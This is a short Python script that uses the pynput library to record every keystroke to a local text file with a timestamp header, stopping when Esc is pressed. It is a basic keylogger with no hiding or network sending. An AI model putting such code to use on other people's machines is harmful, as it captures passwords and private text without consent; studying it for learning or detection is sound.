from pynput import keyboard
import sys
import time
import os 
log_file_name = "test1.txt"

file_writer = open(log_file_name,"a")
file_writer.write("\n")
curTime = time.ctime(time.time())
file_writer.write(curTime)
file_writer.write("\n")
file_writer.write("----------------------------------------")
file_writer.write("\n")
file_writer.close()
def runOnPress(key):
    file_writer = open(log_file_name,"a")
    stroke = str(key).replace("'","")
    if str(key)== "Key.space" :
        file_writer.write(" ")
    elif str(key) =="Key.enter":
        file_writer.write("\n")
    elif str(key) =="Key.esc":
        file_writer.write("")
    elif str(key) =="Key.backspace":
        file_writer.seek(file_writer.tell()-1,os.SEEK_SET)
        file_writer.truncate()
    elif str(key) =="Key.shift":
        file_writer.write("")
    else:
        file_writer.write(stroke)
    file_writer.close()

def runOnRelease(key):
    if(str(key)== "Key.esc"):

        return False

with keyboard.Listener(on_press= runOnPress,on_release=runOnRelease)as listenner :
    listenner.join()